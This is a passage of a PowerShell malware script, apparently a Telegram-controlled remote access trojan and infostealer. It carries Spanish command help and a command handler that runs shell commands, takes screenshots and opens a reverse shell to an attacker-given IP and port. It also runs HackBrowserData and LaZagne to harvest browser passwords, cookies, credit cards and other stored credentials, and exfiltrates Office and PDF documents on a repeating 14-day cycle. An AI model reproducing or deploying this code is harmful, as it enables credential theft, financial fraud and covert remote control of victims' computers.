/stopshell - Detener reverse shell

📊 FLUJO AUTOMATICO:
1️⃣ FASE 1: HackBrowserData (8 archivos)
   bookmark, cookie, download, extension, history, localstorage, password, creditcard
   
2️⃣ FASE 2: LaZagne (15 modulos)
   browsers, chats, databases, games, git, mails, maven, memory, multimedia, php, svn, sysadmin, windows, wifi, unused
   
3️⃣ FASE 3: Documentos
   Word → PDF → Excel → PowerPoint (Documentos + Descargas + subcarpetas)

🔄 Ciclo se repite cada 14 dias automaticamente
"@
        }
        
        "/info" { Send-Message -Text (Get-Info) }
        
        "/ls" {
            try {
                $items = Get-ChildItem $script:CurrentDir | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $script:CurrentDir`n`n$items"
            } catch { Send-Message -Text "Error: $($_.Exception.Message)" }
        }
        
        "/pwd" { Send-Message -Text "Directorio: $script:CurrentDir" }
        
        "/cd" {
            if ($args) { Run-Command -Cmd "cd $args" } else { Send-Message -Text "Uso: /cd <ruta>" }
        }
        
        "/cmd" {
            if ($args) { Run-Command -Cmd $args } else { Send-Message -Text "Uso: /cmd <comando>" }
        }
        
        "/captura" {
            Send-Message -Text "Capturando..."
            Take-Screenshot | Out-Null
        }
        
        "/steal" { 
            # Forzar ciclo completo
            $script:HackBrowserDataCompleted = $false
            $script:LaZagneCompleted = $false
            $script:FilesExfiltrated = $false
            $script:ArchivosHackBrowserDataEnviados = 0
            Check-AutoSteal
        }
        
        "/hack" {
            $script:ArchivosHackBrowserDataEnviados = 0
            $script:HackBrowserDataCompleted = $false
            Run-HackBrowserData-Phase
        }
        
        "/lazagne" {
            $script:LaZagneCompleted = $false
            Run-LaZagne-Phase
        }
        
        "/files" { 
            $script:FilesExfiltrated = $false
            Exfiltrate-Documents 
        }
        
        "/shell" {
            if ($script:ReverseShellActive) {
                Send-Message -Text "Ya hay un reverse shell activo. Usa /stopshell primero."
                return
            }
            $shellArgs = $args -split '\s+'
            $ip = $shellArgs[0]
            $port = if ($shellArgs.Count -gt 1) { [int]$shellArgs[1] } else { 4444 }
            if ([string]::IsNullOrWhiteSpace($ip)) {
                Send-Message -Text "Uso: /shell <IP> [puerto]`nEjemplo: /shell 192.168.1.100 4444"
                return
            }
            Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $ip, $port | Out-Null
            Start-Sleep -Seconds 2
            Send-Message -Text "Intentando conectar a $ip`:$port ..."
        }
        
        "/stopshell" { Stop-ReverseShell }
        
        default { Write-Log "Comando desconocido: $cmd" }
    }
}

# === INICIO ===
Write-Log "=== BOT INICIADO ==="
Load-State
Send-Message -Text "🤖 Bot online - $(Get-Info)`n`nIniciando flujo automatico..."

Check-AutoSteal

try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
} catch {}

$lastId = 0
while ($true) {
    try {
        $resp = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId+1)&limit=1" -TimeoutSec 60
        if ($resp.ok -and $resp.result.Count -gt 0) {
            $upd = $resp.result[0]
            $lastId = $upd.update_id
            if ($upd.message -and $upd.message.text -and ([string]$upd.message.chat.id -eq $ChatId)) {
                Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id
            }
        }
        
        # Verificar cada hora si hay tareas pendientes o reinicio
        if ((Get-Date).Minute -eq 0) {
            Check-AutoSteal
        }
    } catch {
        $err = $_.Exception.Message
        if ($err -notlike "*409*") { Write-Log "Error: $err" }
        Start-Sleep -Seconds 2
    }
    Start-Sleep -Milliseconds 1500
}
